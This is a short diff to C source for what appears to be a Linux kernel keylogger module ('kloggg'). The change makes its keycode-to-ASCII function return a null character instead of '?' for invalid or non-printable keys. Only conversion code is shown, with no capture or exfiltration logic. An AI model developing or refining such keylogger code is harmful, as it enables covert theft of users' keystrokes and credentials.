@@ -49,7 +49,7 @@ static char kloggg_keycode_to_ascii(unsigned int keycode, int shift_mask) {
   char c;
 
   if (keycode >= NR_KEYS)
-    return '?'; // Invalid keycode
+    return '\0'; // Invalid keycode
 
   if (shift_mask & (1 << KG_SHIFT)) {
     symbol = shift_map[keycode];
@@ -66,7 +66,7 @@ static char kloggg_keycode_to_ascii(unsigned int keycode, int shift_mask) {
   if (c == '\n' || c == '\t' || c == '\r')
     return c;
 
-  return '?'; // Non-ASCII or control
+  return '\0'; // Non-ASCII or control
 }
 
 static int kloggg_log(struct notifier_block *nb, unsigned long action, void *data) {
